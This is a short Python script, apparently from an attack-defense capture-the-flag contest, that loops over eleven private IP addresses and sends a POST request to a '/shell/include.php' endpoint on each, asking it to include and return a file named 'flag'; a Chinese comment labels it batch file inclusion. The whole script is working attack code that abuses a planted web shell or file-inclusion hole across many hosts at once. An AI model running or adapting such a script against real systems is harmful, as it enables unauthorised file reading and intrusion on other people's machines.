import requests
for i in range(150,161):
	url = "http://10.201.64." + str(i) + "/shell/include.php"

	data = {

		'a':'flag'
	}

	try:
		re = requests.post(url=url, data=data, timeout=1)
		print(re.text)
	except:
		print('no')

//批量包含读取文件